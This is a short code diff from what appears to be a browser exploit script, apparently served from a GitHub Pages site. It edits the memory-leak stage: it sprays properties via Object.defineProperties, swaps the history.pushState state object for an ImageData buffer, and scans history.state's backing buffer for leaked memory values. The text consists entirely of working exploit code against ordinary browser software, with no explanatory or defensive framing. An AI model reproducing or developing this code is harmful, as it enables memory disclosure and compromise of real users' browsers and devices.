@@ -139,13 +139,13 @@ var props={};for(var i=0;i<16384/2;){
 props[i++]={value:1111638594};
 props[i++]={value:tgt};
 };
-const state1={'page_id':1,'user_id':5};
+const state1=new ImageData(1,16384);
 var foundLeak=undefined;
 var foundIndex=0;
 var maxCount=256;
 while(foundLeak==undefined&&maxCount>0){
 maxCount--;
-history.pushState(y,'','mahamadoumgs.github.io/index.html');
+history.pushState(state1,'','mahamadoumgs.github.io/index.html');
 Object.defineProperties({},props);
 var leak=new Uint32Array(history.state.data.buffer);
 for(var i=0;i<leak.length-6;i++){
